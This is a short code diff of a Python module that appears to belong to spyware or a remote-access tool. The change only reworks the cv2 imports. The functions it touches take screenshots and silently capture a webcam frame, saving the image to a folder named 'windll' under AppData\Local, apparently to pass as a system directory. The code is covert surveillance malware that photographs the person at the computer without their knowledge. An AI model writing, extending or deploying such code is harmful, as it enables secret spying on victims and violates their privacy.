@@ -11,7 +11,7 @@
 #-----------------------------------------------------------------------------#
 from PIL import ImageGrab
 from os import environ,sep
-import cv2
+from cv2 import VideoCapture, imwrite
 from manager.logger import Log
 
 def Screenshot():
@@ -25,11 +25,11 @@ def Screenshot():
 def WebCam(): 
 	try:
 		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		cap = cv2.VideoCapture(0)
+		cap = VideoCapture(0)
 		for i in range(30):
 			cap.read()
 		ret, frame = cap.read()
-		cv2.imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
+		imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
 		cap.release()
 	except Exception as e:
 		Log(f"WebCam ---> {e}")
